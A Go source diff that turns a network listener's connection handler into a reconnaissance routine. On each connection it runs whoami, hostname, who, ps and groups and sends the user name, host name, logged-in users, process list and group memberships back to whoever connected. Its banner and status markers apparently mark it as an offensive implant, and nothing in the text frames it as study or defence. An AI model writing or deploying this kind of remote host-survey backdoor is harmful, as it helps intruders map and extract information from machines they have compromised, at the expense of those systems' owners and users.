@@ -6,9 +6,43 @@ import (
 	"os/exec"
 )
 
-func handleConnection(conn net.Conn) {
+func handler(conn net.Conn) {
 
-	_, err := conn.Write([]byte("[+] session established\n"))
+	_, err := conn.Write([]byte("[+] session established.\n"))
+	if err != nil {
+		fmt.Printf("[-] session failed %v", err)
+	}
+
+	whoami := exec.Command("whoami")
+	n, err := whoami.CombinedOutput()
+	if err != nil {
+		fmt.Printf("[-] whoami failed %v", err)
+	}
+
+	hostname := exec.Command("hostname")
+	h, err := hostname.CombinedOutput()
+	if err != nil {
+		fmt.Printf("[-] hostname failed %v", err)
+	}
+
+	who := exec.Command("who")
+	w, err := who.CombinedOutput()
+	if err != nil {
+		fmt.Printf("[-] who failed %v", err)
+	}
+
+	ps := exec.Command("ps")
+	p, err := ps.CombinedOutput()
+	if err != nil {
+		fmt.Printf("[-] ps failed %v", err)
+	}
+	groups := exec.Command("groups")
+	g, err := groups.CombinedOutput()
+	if err != nil {
+		fmt.Printf("[-] groups failed %v", err)
+	}
+
+	_, err = conn.Write([]byte("[*] hostname is " + string(h) + "[*] username is " + string(n) + "[*] active users:\n " + string(w) + string(p) + "[*] groups: " + string(g)))
 	if err != nil {
 		fmt.Printf("[-] session failed %v", err)
 	}
@@ -39,7 +73,7 @@ func main() {
 		if err != nil {
 			fmt.Printf("[-] connection failed %v", err)
 		}
-		go handleConnection(conn)
+		go handler(conn)
 	}
 
 }
